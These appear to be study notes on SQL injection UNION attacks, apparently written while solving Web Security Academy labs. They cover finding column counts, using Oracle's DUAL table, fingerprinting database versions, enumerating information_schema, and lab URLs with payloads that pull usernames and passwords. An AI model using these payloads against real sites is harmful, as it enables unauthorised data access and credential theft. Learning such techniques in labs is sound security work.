
if website is returning data for SELECT a, b FROM table1
we can union it to fetch data from different table too
`SELECT a, b FROM table1 UNION SELECT c, d FROM table2`

To carry out a SQL injection UNION attack, make sure that your attack meets these two requirements. This normally involves finding out:

- How many columns are being returned from the original query.
- Which columns returned from the original query are of a suitable data type to hold the results from the injected query.


1. we can use order clause

select a, b from table1
select a, b from table1 order 1
select a, b from table1 order 2
select a, b from table1 order 3 -- will give error (so we have 2 columns)

2. we can use select null

select a, b from table1
select a, b from table1 union select null  -- will give error
select a, b from table1 union select null, null

On Oracle, every `SELECT` query must use the `FROM` keyword and specify a valid table. There is a built-in table on Oracle called `dual` which can be used for this purpose. So the injected queries on Oracle would need to look like:

`' UNION SELECT NULL FROM DUAL--`

### Get useful data from other tables with the help of union

https://0a48009a0335de0681309eb3006f005d.web-security-academy.net/filter?category=Gifts' union select username,password from users--

if only one column is available
https://0a1a009e04c3f8798089d51a003100bb.web-security-academy.net/filter?category=Pets' union select null,concat(username,password) from users--


## Check database type and version

| Database type    | Query                     |
| ---------------- | ------------------------- |
| Microsoft, MySQL | `SELECT @@version`        |
| Oracle           | `SELECT * FROM v$version` |
| PostgreSQL       | `SELECT version()`        |
' UNION SELECT @@version--
OR
' UNION SELECT @@version #


## Get info related to tables and columns (non oracle DBs)

![[Pasted image 20250816125753.png]]

In short

to get data of all the tables
```sql '+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--```

to get all the columns of this table
```sql '+UNION+SELECT+ COLUMN_NAME,NULL+FROM+information_schema.columns+where+table_name='users_eyhvys'--```

or to get all column name and table name of all the tables
```sql '+UNION+SELECT+ COLUMN_NAME,TABLE_NAME+FROM+information_schema.columns-- ```

